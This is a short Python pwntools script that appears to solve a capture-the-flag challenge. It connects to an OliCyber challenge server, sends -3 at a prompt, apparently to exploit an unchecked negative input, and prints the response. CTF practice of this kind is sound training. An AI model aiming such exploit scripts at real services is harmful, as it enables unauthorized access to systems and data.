#!/usr/bin/env python3
from pwn import *
r = remote("instagram.challs.olicyber.it", 10101)
r.sendlineafter(b":\n> ", str(-3).encode())
print(r.recv(110).decode())
